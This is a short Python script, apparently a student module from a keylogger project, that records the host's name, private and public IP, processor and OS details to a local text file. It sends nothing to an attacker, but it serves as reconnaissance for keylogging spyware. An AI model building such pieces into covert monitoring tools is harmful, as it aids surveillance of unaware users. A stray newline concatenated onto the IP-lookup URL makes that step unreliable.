# Platform and Socket libraries for gathering System Information
import socket
import platform

# Import get to allow for use of online ip finders
from requests import get

# Initialize file to save info into
system_information = "SysInfo.txt"

# file path to save information to
file_path = "C:\\Users\\Bryce\\PycharmProjects\\Project 4 - Keylogger\\Pieces\\Sys Info"
extend = "\\"
file_merge = file_path + extend

def computer_information():
    with open(file_merge + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org" '\n').text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public Ip Address (most likely max query\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

computer_information()